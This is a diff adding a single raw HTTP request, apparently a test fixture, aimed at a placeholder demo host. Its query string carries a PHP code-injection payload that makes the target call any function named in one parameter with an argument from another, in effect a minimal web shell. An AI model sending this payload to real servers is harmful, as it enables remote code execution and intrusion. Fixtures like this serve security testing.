@@ -1,0 +1,4 @@
+GET /a?input='$f%3D$_GET['f'];$f($_GET['a']);' HTTP/1.1
+Host: demo.example.com
+Connection: close
+
